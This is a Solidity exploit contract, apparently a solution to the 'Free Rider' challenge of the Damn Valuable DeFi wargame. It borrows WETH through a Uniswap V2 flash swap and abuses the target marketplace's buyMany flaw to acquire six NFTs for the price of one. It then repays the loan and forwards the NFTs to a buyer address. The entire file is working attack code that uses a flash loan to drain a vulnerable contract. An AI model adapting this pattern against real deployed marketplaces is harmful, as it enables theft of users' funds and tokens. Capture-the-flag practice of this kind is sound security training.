// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint) external;
    function deposit() payable external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract HackFreeRider is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair pair;
    IWETH weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT token;
    address buyer;

    constructor(address pairAddress, address wethAddress, address marketplaceAddress, address tokenAddress, address _buyer) {
        pair = IUniswapV2Pair(pairAddress);
        weth = IWETH(payable(wethAddress));
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        token = DamnValuableNFT(tokenAddress);
        buyer = _buyer;
    }

    function hack(uint256 amount) external {
        pair.swap(amount, 0, address(this), "h4ck");

        for (uint i = 0; i < 6; i++) {
            token.safeTransferFrom(address(this), buyer, i);
        }
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external override {
        weth.withdraw(amount0);

        uint[] memory ids = new uint[](6);
        for (uint i = 0; i < 6; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: amount0}(ids);

        uint256 fee = ((amount0 * 3) / 997) + 1;
        uint256 repay = amount0 + fee;
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    )
        external
        override
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
